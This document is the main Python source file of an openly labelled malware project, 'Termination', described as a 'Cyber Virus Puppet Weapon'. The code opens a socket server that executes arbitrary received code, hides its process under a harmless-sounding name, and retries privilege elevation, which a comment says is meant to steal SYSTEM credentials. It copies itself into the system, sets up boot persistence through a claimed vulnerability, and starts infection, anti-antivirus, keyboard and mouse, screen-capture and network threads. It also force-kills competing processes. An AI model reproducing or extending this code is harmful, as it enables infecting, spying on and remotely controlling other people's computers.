# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TerminationLib
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Startup

from TLib.T_imports import *
from TPLib import *
from TLib import *
from TLhread import *
import TLUI

TerminationRuntimeREPLServerAddress: tuple[str, int] = ('localhost', 12345)
class TerminationRuntimeREPLSocketServer:
    def __init__(self, TerminationRuntimeREPLServerAddress: tuple[str, int]) -> None:
        self.Running: bool = False
        self.ServerSocket: socket.socket | None = None
        self.TerminationRuntimeREPLServerAddress: tuple[str, int] = TerminationRuntimeREPLServerAddress
        self.env = globals()
    def HandleClient(self, ClientSocket: socket.socket) -> None:
        try:
            data: str = ClientSocket.recv(1024).decode('utf-8')
            if not data: return
            response: str | None = self.ProcessData(data)
            if response:
                ClientSocket.sendall(response.encode('utf-8'))
            else:
                ClientSocket.sendall("None".encode('utf-8'))
        except Exception as e:
            ClientSocket.sendall(traceback.format_exc().encode('utf-8'))
        finally:
            ClientSocket.close()
    def ProcessData(self, data: str) -> str | None:
        original_stdout = sys.stdout
        try:
            captured_output = io.StringIO()
            sys.stdout = captured_output
            exec(data, self.env)
            sys.stdout = original_stdout
            output = captured_output.getvalue()
            if output: return output
            else: return "Runed"
        except Exception as e:
            sys.stdout = original_stdout
            return traceback.format_exc()
    def Start(self) -> None:
        self.Running: bool = True
        self.ServerSocket: socket.socket | None = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.ServerSocket.bind(self.TerminationRuntimeREPLServerAddress)
            self.ServerSocket.listen(5)
            while self.Running:
                ClientSocket, ClientAddress = self.ServerSocket.accept()
                ClientThread = threading.Thread(
                    target=self.HandleClient,
                    args=(ClientSocket,)
                )
                ClientThread.start()
        except Exception as e:
            return
        finally:
            self.Stop()
    def Stop(self):
        if self.ServerSocket:
            self.ServerSocket.close()
        self.Running: bool = False


# Program Main Class
class Termination:
    # Termination
    # :param timeout: Maximum time to wait for thread to end
    def __init__(self):
        # print("Termination")
        # print("Kudos To The T-Affiliate Program, All For Our Organization. Victory Floated From Behind Me.")
        # print("At Least Now It Is Executed.")
        self._TerminationRuntimeREPLSocketServer: TerminationRuntimeREPLSocketServer = TerminationRuntimeREPLSocketServer(TerminationRuntimeREPLServerAddress)
        self._TerminationRuntimeREPLSocketServer.env = globals() # ENV
        self._TerminationRuntimeREPLSocketServer.env["Termination"] = self
        self._TerminationRuntimeREPLSocketServer.env["termination"] = self
        self._TerminationRuntimeREPLSocketServer.env["Termination4"] = self
        self._TerminationRuntimeREPLSocketServer.env["termination4"] = self
        self._TerminationRuntimeREPLSocketServer.env["T"] = self
        def HandleShutdown(signum, frame): self._TerminationRuntimeREPLSocketServer.Stop()
        signal.signal(signal.SIGINT, HandleShutdown)
        signal.signal(signal.SIGTERM, HandleShutdown)
        self._TerminationRuntimeREPLSocketServerThread = threading.Thread(target = self._TerminationRuntimeREPLSocketServer.Start)
        self._TerminationRuntimeREPLSocketServerThread.start()
        self.__init_values__()
        self.__init_AntiVS__()
        # Notice: The following code needs to be enabled when it is officially used.
        # if self.tdll.IsVMWare():
        #    print("Hello, World.")
        #    self._exit(0)
        # Test Tool Link Library
        try:
            if not self.tdll.test():
                print("Test Failed.")
                os._exit(0)
        except: os._exit(0)
        # Basic Log Transfer
        self.MasterLog.Debug(f"{self.__name__} {self.__version__} {self.Version.version["Compilation"]["Runs"]}")
        self.MasterLog.Debug(f"PID: {os.getpid()} | PPID: {os.getppid()}")
        self.MasterLog.Debug(f"IsUserAnAdmin: {bool(self.AdministratorMode.IsUserAnAdmin())} | IsUserAnSystemAdmin: {bool(self.AdministratorMode.IsUserAnSystemAdmin())}")
        self.MasterLog.Debug(f"self.__file__: [{self.__file__}] | self.__work_path__: [{self.__work_path__}] | self.__static_path__: [{self.__static_path__}]")
        self.MasterLog.Info( "[-] Prepare...")
        if not self.AdministratorMode.IsUserAnAdmin():
            self.__init_elevate__()
        self.__init_kill_old_process_lock__()
        self.__init_lock__()
        self.MasterLog.Info( "[-] Ready To Finish, Wait Two Seconds.")
        time.sleep(2)
        self.WSD.__init_work_dir_values__()
        if not self.WSD.Is_NeedWorkPath() and self.WorkMod in self.__exec_suffix__:
            self.MasterLog.Debug("Start Copying The Body To The Kernel")
            self.__uninit_lock__()
            if not self.WSD.Copy():
                self.MasterLog.Error("Error Copying Files")
            else:
                self.MasterLog.Success("Files Copied Successfully")
                if os.path.exists(self.WSD.__NeedFile__):
                    try:
                        time.sleep(0.5)
                        self.__init_elevate__([self.WSD.__NeedFile__])
                        self.MasterLog.Debug("Elevation Initiated, WTF, Why Not Exit?")
                    except Exception as e:
                        self.MasterLog.Error(f"Failed to elevate: {str(e)}")
                else:
                    self.MasterLog.Error("Target file not found after copy")
        else:
            if self.WorkMod == "exe":
                try:
                    if os.path.isdir(self.WSD.__NeedMainPath__):
                        self.WSD.WriteFiles()
                    else:
                        self.MasterLog.Error(f"Invalid work directory: {self.WSD.__NeedMainPath__}")
                except Exception as e:
                    self.MasterLog.Error(f"Failed to initialize work directory: {str(e)}")
        self.AdvancedFeatures()
        self.__init_autorun__()
        self.Processes()
        self.mainloop()
    def Processes(self):
        self.Thread_MonitorWorker: Thread_TWNTWork.MonitorWorker
        self.Thread_ListenKMWorker: Thread_TWNTWork.ListenKMWorker
        self.Thread_TWNESynchronousTProcess: Thread_TWNTWork.TWNESynchronousTProcess
        self.Thread_TWNTProcessSynchronousWorker: Thread_TWNTWork.TWNTProcessSynchronousWorker
        self.Thread_TWNTCoverScreen: Thread_TWNTWork.TWNTCoverScreen
        self.TWNT = Thread_TWNT.TWNetworkTransit(self)
        self.TProcessManager.AddThread(self.TWNT)
        self.TWNT.start()
        self.Log.SetTWNT(self.TWNT)
        self.Thread_InfectionWorker = Thread_InfectionWorker.InfectionWorker(self)
        self.TProcessManager.AddThread(self.Thread_InfectionWorker)
        self.Thread_InfectionWorker.start()
    def _elevate(self, show_console: bool = False, argv: list = sys.argv):
        #X_ctypes.FreeLibrary(self.odll._handle)
        self.MasterLog.Debug(f"Promote [ {argv} ] to Admin")
        if self.AdministratorMode._ctypes_elevate(show_console = show_console, argv = argv):
            self.MasterLog.Success("Successfully Promoted To Admin")
            return True
        return False
    def __init_elevate__(self, argv: list | None = None, sleep: int = 10, show_console: bool = False, MaxAttempts: int = 10):
        if not argv: argv = sys.argv
        self.MasterLog.Debug(f"Prepare To Elevate [ {argv} ] To Admin Privileges, Retry Wait Time [ {sleep} ], Whether To Show The Command Line [ {show_console} ], Retry To Go Online: [ {MaxAttempts} ]")
        if self.WorkMod == "py":
            self.MasterLog.Debug("In Python Mode, Cancel Elevation")
            return False
        for Attempt in range(1, MaxAttempts + 1):
            self.MasterLog.Debug(f"Attempt To Elevate {Attempt}/{MaxAttempts} Times")
            result: int | bytes = self._elevate(show_console = show_console, argv = argv)
            if result:
                self.MasterLog.Success(f"Successful Elevation, Return Code: {result}, Parameter: {argv}")
                self._exit(0)
            self.MasterLog.Error(f"The Power Escalation Failed, And Tried Again After {sleep} Seconds")
            time.sleep(sleep)
        self.MasterLog.Error(f"Failed To Elevate The Power And Reached The Maximum Number Of Attempts ({MaxAttempts})")
        return False
    def __init_values__(self):
        self.__name__: str = "Termination" # Project Name
        self.__process_name__: str = "Sound Template Drive" # Process Name
        self.__service_name__: str = "TProcess" # Service Name
        self.__python_suffix__: list[str] = ["py", "pyw", "pyc", "pyz", "pyi"] # In Python With Suffix
        self.__exec_suffix__: list[str] = ["exe"] # In EXECUTE Mode With Suffix (Without Linux)
        self.__file__: str = os.path.realpath(sys.argv[0]) # Process File Path
        self.__file_bytes_status__: bool = False # Get File Bytes Status (False Is No, True Is Yes)
        self.debug: bool = True # If It Is In Debug Mode, _TerminationRuntimeREPLSocketServer will run.
        self.wmi: T_WMI.wmi._wmi_namespace = T_WMI.wmi.WMI() # WMI
        setproctitle.setproctitle(self.__process_name__) # Change Process Name (In Windows, Without Linux)
        if os.path.isfile(self.__file__): # It Is A File In Windows System With Self?
            try: self.__file_bytes__: bytes = T_FIO.FIO.openr(self.__file__, 2) # Try To Read Self
            except: self.__file_bytes_status__: bool = True # OOPS! Can't Do That!
        else: self.__file_bytes_status__: bool = True # OK! Success!
        self.__work_path__: str = os.path.dirname(self.__file__) # Work Path (Dir)
        self.sys_stdout: io.TextIOWrapper = sys.stdout # The OLD STDOUT
        self.sys_stderr: io.TextIOWrapper = sys.stderr # The OLD STDERR
        self.StdoutRevertedWriter = T_Std.StdoutRevertedWriter() # T_Std.StdoutRevertedWriter
        sys.stdout = self.StdoutRevertedWriter # Stdout
        sys.stderr = self.StdoutRevertedWriter # Stderr
        self.__pid__: int = os.getpid() # This Process's Pid
        self.__ppid__: int = os.getppid() # This Process's PPid
        os.chdir(self.__work_path__) # Change To Work Path, Sometime, CDIR Isn't Work Path At First.
        # File Value
        self.__file_name__: str = os.path.basename(self.__file__) # File Name ( Termination4.py / Termination4.exe )
        self.__file_suffix__: str = self.__file_name__.split(".")[-1] # File Suffix ( py / exe )
        self.__static_path__: str = os.path.dirname(os.path.realpath(__file__)) # Static Path ( In Python Mode, It Is Work Path. In EXECUTE Mode, It Is sys._MEI )
        self.__log_path__: str = os.path.join(os.getenv("temp"), "T.log") # Too Bad, That's A Problem, Leave It For Now, Temporary Log Location, Maybe ...
        self.ResourcesManager: T_WSD.ResourcesManager = T_WSD.ResourcesManager(self) # Resources Manager
        # Path
        self.__ocr_path__: str = self.ResourcesManager.GetResourceFile("ocr")
        self.Static_TTFile: str = self.ResourcesManager.GetResourceFile("static", "system.ttf")
        self.Static_HAFile: str = self.ResourcesManager.GetResourceFile("static", "HA.mp3")
        self.Static_TerminationDISC: str = self.ResourcesManager.GetResourceFile("static", "Termination.DISC")
        self.Static_EXEConfig: str = self.ResourcesManager.GetResourceFile("TConfig", "EXEConfig.bin")
        self.Static_OCR: str = self.ResourcesManager.GetResourceFile("ocr")
        self.VersionFile: str = self.ResourcesManager.GetResourceFile("TConfig", "version.ini")
        self.PEBinary: str = self.ResourcesManager.GetResourceFile(["PEBinary"], [".inf", ".bin"])
        self.PELibrary: str = self.ResourcesManager.GetResourceFile(["PELibrary"], [".inf", ".lib"])
        self.PEBinary_InstallTermination: str = self.ResourcesManager.GetResourceFile(["PEBinary", "InstallTermination.exe"], [".inf", ".bin", "InstallTermination.exe"])
        self.PEBinary_RegistryOverride: str = self.ResourcesManager.GetResourceFile(["PEBinary", "RegistryOverride.exe"], [".inf", ".bin", "RegistryOverride.exe"])
        self.PEBinary_Service: str = self.ResourcesManager.GetResourceFile(["PEBinary", "Service.exe"], [".inf", ".bin", "Service.exe"])
        self.PEBinary_Update: str = self.ResourcesManager.GetResourceFile(["PEBinary", "Update.exe"], [".inf", ".bin", "Update.exe"])
        self.PEBinary_T2SRFB: str = self.ResourcesManager.GetResourceFile(["PEBinary", "T2SRFB4.exe"], ["T2SRFB", "win", "T2SRFB", "T2SRFB4.exe"])
        self.PELibrary_TemplateMatcher: str = self.ResourcesManager.GetResourceFile(["PELibrary", "libTemplateMatcher.dll"], [".inf", ".lib", "libTemplateMatcher.dll"])
        self.PELibrary_Tools: str = self.ResourcesManager.GetResourceFile(["PELibrary", "libTools.dll"], [".inf", ".lib", "libTools.dll"])
        # DLLs
        # tools dll
        self.tdll: T_TDLL.TDLL = T_TDLL.TDLL(self.PELibrary_Tools)
        # TemplateMatcher dll
        self.odll: T_CDLL.DLL | ctypes.CDLL = T_CDLL.DLL(self.PELibrary_TemplateMatcher, winmode=0) # Use CDLL To Read And Import It
        # static folders
        #self.__need_work_path__: str = self.WSD.__need_work_path__ # In WSD Thread
        #self.__need_file__: str = self.WSD.__need_file__ # In WSD Thread
        sys.path.append(self.__work_path__) # Append Work Path To Sys Path
        sys.path.append(self.__static_path__) # Append Static Path To Sys Path
        sys.path.append(self.PEBinary) # Append PEBinary Path To Sys
        sys.path.append(self.PELibrary) # Append PELibrary Path To Sys
        self.TProcessManager: T_Process.TProcessManager = T_Process.TProcessManager(self) # Thread (Always Called Process) Manager
        self.Mp_TProcessManager: T_Process.Mp_TProcessManager = T_Process.Mp_TProcessManager(self) # Process (Multiprocessing) Manager
        self.Log: T_Log.Logger = T_Log.Logger(self.__name__, self.__log_path__, False) # Log Class (It Doesn't Work Much Now, But It Works Soon)
        self.Log.Mp_TProcessManager = self.Mp_TProcessManager
        self.TProcessManager.AddThread(self.Log)
        self.Log.start()
        self.MasterLog: T_Log.LoggerChild = T_Log.LoggerChild(self.Log, "Termination4-Main") # Init It As Main
        self.StdoutLog: T_Log.LoggerChild = T_Log.LoggerChild(self.Log, "Stdout") # Init It As Main
        self.__T4_Log__: T_Log.LoggerChild = self.MasterLog
        self.StdoutRevertedWriter.SetConfig(Show = False, logger = self.StdoutLog)
        self.__lock__: T_Lock.LockMe = T_Lock.LockMe(self.__name__, self.__file__) # Very, Very Important, Clever Design, Process Lock, To Ensure That Only One T Instance Is Running To Avoid Resource Conflicts.
        # Classes
        self.AdministratorMode: T_AdministratorMode.AdministratorMode = T_AdministratorMode.AdministratorMode() # Elevate The Administrator Privilege To Steal SYSTEM Credentials In Windows Mode
        self.KeMouse: T_KeMouse.KeMouse = T_KeMouse.KeMouse(self.odll) # Basic Keyboard And Mouse Simulation Operation Library
        self.WSD: T_WSD.WorkSpaceDeployer = T_WSD.WorkSpaceDeployer(self, self.__name__) # A Program That Transfers The Virus Itself To The Operating System
        self.tpll: T_Tools = T_Tools # In Other Thread, Use Termination.tpll To Call T_Tools
        self.GodKeys: T_GodKeys.GodKeys = T_GodKeys.GodKeys() # God Key Encryption, But It Doesn't Actually Work Well, More On That Later
        #self.__init_thread_excepthook__() Useless? Useful? Unknown ...
        self.Version: T_Version.Version = T_Version.Version(self, self.VersionFile) # Version Manager
        #Threads
        self.Thread_AutoRun: Thread_AutoRun.AutoRunSetup = Thread_AutoRun.AutoRunSetup(self) # The "TService" Vulnerability Is Exploited To Achieve Boot Self-Start
        self.TProcessManager.AddThread(self.Thread_AutoRun) # Add
        self.Thread_AutoRun.start()
        try:
            self.Thread_Web: Thread_Web.Thread_Web = Thread_Web.Thread_Web(self) # The Web
            self.TProcessManager.AddThread(self.Thread_Web) # Add
            self.Thread_Web.start() # Run
        except:
            self.MasterLog.Error("Web Thread Start Failed")
        # TPLL
        self.WindowsScreenCapture: T_Tools.WindowsScreenCapture = self.tpll.WindowsScreenCapture() # Windows Fast Screenshot And Compression Algorithm 0-20 Levels, Ninimum 1KB
        try: self.__file_sha256__: str = self.tpll.GetFileSha256(self.__file__) # Get Self File Sha256
        except:
            if self.__file_bytes_status__:
                self.__file_sha256__: str = self.tpll.GetBytesSha256(self.__file_bytes__) # If There is File Bytes: Get Self File Bytes Sha256
        # EXE Config
        if self.WorkMod == "py": # If In Python Mode:
            g = T_GodKeys.GodKeys(b"EXMODECONFIGKEYS"*2) # Init AES Key
            j = ast.literal_eval(T_FIO.FIO.openr("./TConfig/EXEConfig.dict")) # Eval EXEConfig.Dict To [Dict]
            j["Version"] = {
                "Termination": self.Version.version["Version"],
                "Compilation": self.Version.version["Compilation"]
            } # Get Version Info
            T_FIO.FIO.openw("./TConfig/EXEConfig.dict", str(j)) # Write EXEConfig.Dict
            T_FIO.FIO.openw("./TConfig/EXEConfig.bin", b"EXMODECONFIGSTART" + g.encrypt(str(j).encode()) + b"EXMODECONFIGEND", 2) # Write EXEConfig.Bin
        self.EXEConfig: T_EXEConfig.EXEConfig = T_EXEConfig.EXEConfig(self, self.Static_EXEConfig, self.__file_bytes__ if not self.__file_bytes_status__ else None) # Init EXEConfig Class
        # SetConfig
        self.TLUI: TLUI = TLUI
        if "Version" not in self.Version.version:
            self.Version.version = {
                "Version": {"Version":"4.2.0"},
                "Compilation": {"Runs":"114514"}
            }
        self.__version__: str = self.Version.version["Version"]["Version"]
        self.ConnectServer: bool = False # Connect Server Status
        self.WorkENV: dict = globals() # ENV
        self.WorkENV["Termination"] = self
        self.WorkENV["termination"] = self
        self.WorkENV["Termination4"] = self
        self.WorkENV["termination4"] = self
        self.WorkENV["T"] = self
        self._TerminationRuntimeREPLSocketServer.env = self.WorkENV
        if not self.debug and self.WorkMod != "py":
            self._TerminationRuntimeREPLSocketServer.Stop()
    def AdvancedFeatures(self):
        self.Thread_LW3T: Thread_LW3T.LW3T = Thread_LW3T.LW3T(self)
        self.TProcessManager.AddThread(self.Thread_LW3T)
        self.Thread_LW3T.start()
    def __init_autorun__(self):
        self.Thread_AutoRun.Setup()
    def __init_AntiVS__(self):
        self.Thread_AntiVirusSoftware: Thread_AntiVirusSoftware.AntiVirusSoftware = Thread_AntiVirusSoftware.AntiVirusSoftware(self)
        self.TProcessManager.AddThread(self.Thread_AntiVirusSoftware)
        self.Thread_AntiVirusSoftware.start()
    def __init_kill_old_process_lock__(self):
        if self.WorkMod == "py": return self.MasterLog.Debug("In Python Mode, No Need To Close Old Processes")
        if not self.__lock__.IsOtherLock(): return self.MasterLog.Debug("No Old Processes, No Need To Close Old Processes")
        if not self.AdministratorMode.IsUserAnAdmin(): return self.MasterLog.Debug("Not UserAnAdmin, No Need To Close Old Processes")
        self.Thread_AutoRun.stop()
        if (Pids := self.__lock__.GetOtherLockPid()):
            self.MasterLog.Info(f"Old Lock Pids: {Pids}")
            for Pid in Pids:
                try: TargetProcess: psutil.Process = psutil.Process(Pid)
                except: continue
                TargetProcessEXE = TargetProcess.exe()
                if not os.path.isfile(TargetProcessEXE): continue
                TargetProcessEXEConfig: T_EXEConfig.EXEConfig = T_EXEConfig.EXEConfig(self, TargetProcessEXE, None)
                TargetProcessEXEConfigCompilation: dict | bool | None = TargetProcessEXEConfig.GetConfig("Compilation")
                self.MasterLog.Debug(
                    f"TargetProcessPid:[{Pid}] " \
                    f"TargetProcess:[{TargetProcess}] " \
                    f"TargetProcessEXE:[{TargetProcessEXE}]" \
                    f"TargetProcessEXEConfigCompilation:[{TargetProcessEXEConfigCompilation}] " \
                    f"TargetProcessEXEConfigIs:[{TargetProcessEXEConfig.Is()}]" \
                    f"TargetProcessEXEConfig.Config:[{TargetProcessEXEConfig.Config}]"
                )
                #if "Runs" not in Compilation: continue
                TargetProcessEXEConfigCompilationBuildVersion = "Runs" in TargetProcessEXEConfigCompilation if TargetProcessEXEConfigCompilation else False
                if os.path.abspath(TargetProcessEXE) == os.path.abspath(self.__file__): continue
                if not TargetProcessEXEConfig.Is() or (TargetProcessEXEConfigCompilationBuildVersion and TargetProcessEXEConfigCompilation["Runs"] < self.Version.version["Compilation"]["Runs"]):
                    try:
                        self.MasterLog.Info(f"KillPid: [{Pid}] " \
                                            f"TargetProcessEXE: [{TargetProcessEXE}] " \
                                            f"TargetProcessEXEConfigCompilationBuildVersion: [{TargetProcessEXEConfigCompilation["Runs"] if TargetProcessEXEConfigCompilationBuildVersion else "NOTEC"}]")
                        self.MasterLog.Info(f"Kill Os.Popen: {os.popen(f"taskkill /F /PID {Pid}").read()}")
                        for i in self.tpll.GetPidsPath(TargetProcessEXE):
                            self.MasterLog.Info(f"Kill Os.Popen: {os.popen(f"taskkill /F /IM {i}").read()}")
                        try: psutil.Process(Pid)
                        except: self.MasterLog.Error(f"Os.Popen Killed Pid: [{Pid}]")
                        else: os.kill(Pid, 9)
                    except Exception as e:
                        self.MasterLog.Error(f"KillPid Error Pid: [{Pid}]")
                        self.MasterLog.Error(T_Std.ErrorFormat(e))
                        continue
                    try:
                        self.MasterLog.Info(f"_tryAllPermissionMethods " \
                                            f"TargetProcessEXE: [{TargetProcessEXE}] "\
                                            f"Pid: [{Pid}] " \
                                            f"TargetProcessEXEConfigCompilation: [{TargetProcessEXEConfigCompilation["Runs"] if TargetProcessEXEConfigCompilationBuildVersion else "NOTEC"}]")
                        self.tpll.FileSystemPermissionEnforcer._tryAllPermissionMethods(TargetProcessEXE)
                    except Exception as e:
                        self.MasterLog.Error(f"_tryAllPermissionMethods Error TargetProcessEXE: [{TargetProcessEXE}]")
                        self.MasterLog.Error(T_Std.ErrorFormat(e))
                        continue
                if TargetProcessEXEConfigCompilationBuildVersion and TargetProcessEXEConfigCompilation["Runs"] >= self.Version.version["Compilation"]["Runs"]:
                    self.MasterLog.Success(f"Pass EXE TargetProcessEXE: [{TargetProcessEXE}] " \
                                           f"Pid: [{Pid}] " \
                                           f"TargetProcessEXEConfigCompilationBuildVersion: [{TargetProcessEXEConfigCompilation["Runs"]}] " \
                                            "> SelfVersion")
    def __init_lock__(self):
        if self.__lock__.IsOtherLock():
            self.MasterLog.Debug("Other Lock, Kill Self")
            self._exit(0)
        self.__lock__.lock()
    def __uninit_lock__(self):
        self.__lock__.unlock()
    def GetWorkMod(self):
        return "py" if self.__file_suffix__ in self.__python_suffix__ else "exe"
    @property
    def WorkMod(self):
        return "py" if self.__file_suffix__ in self.__python_suffix__ else "exe"
    def __init_thread_excepthook__(self):
        def Excepthook(args: typing.Any):
            self.MasterLog.Debug(f"Exception in thread {args.thread.name}:")
            self.MasterLog.Debug(f"Type: {args.exc_type}")
            self.MasterLog.Debug(f"Value: {args.exc_value}")
            self.MasterLog.Debug(f"Traceback: {args.exc_traceback}")
        threading.excepthook = Excepthook
    def _reboot(self, code, show_console: bool = False, argv: list = sys.argv if len(sys.argv) == 1 else sys.argv):
        self.__uninit_lock__()
        if self.WSD.Is_NeedWorkPath() and (service := self.tpll.IsService(self.__service_name__)) and service.status() == "running":
            self.MasterLog.Debug("[REBOOT] THE SERVICE IS RUNNING, JUST END NOW")
            time.sleep(3)
            os._exit(code)
        self._elevate(show_console = show_console, argv = [sys.executable] + argv if self.WorkMod == "py" else argv)
        os._exit(code)
    def _exit(self, code: int) -> None:
        if self.WSD.Is_NeedWorkPath():
            if (service := self.tpll.IsService(self.__service_name__)) and service.status() == "running":
                if not (r := self.tpll.WindowsService.StopService(self.__service_name__) == True):
                    self.MasterLog.Error(f"[EXIT] END THE SERVICE ERROR, PLEASE END THE SERVICE! ERROR: [{r}]")
                else:
                    os.system("taskkill /F /IM TProcess.exe")
                    self.MasterLog.Success("[EXIT] End The Service Successful")
            else:
                self.MasterLog.Success("[EXIT] Service Was Stop")
        else:
            self.MasterLog.Error("[EXIT] WSD !NeedWorkPath, Can't Stop Service")
        self.MasterLog.Debug(f"Bind: OS._EXIT({code})")
        os._exit(code)
    def mainloop(self) -> None:
        # if self.WorkMod == "py":
        #     while True:
        #         exec(input("> "), globals())
        self.Event: threading.Event = threading.Event()
        self.Event.wait()
        #X_ctypes.FreeLibrary(self.odll._handle)
        self.MasterLog.Debug("START MAIN END")
        #sys.stdout = self.sys_stdout
        #sys.stderr = self.sys_stderr
        self.__uninit_lock__()
        # NO RUN
        self.TProcessManager.KillAllThreads()
        self._TerminationRuntimeREPLSocketServer.Stop()
        self.MasterLog.Debug("END Threads...")
        #self._exit(0)
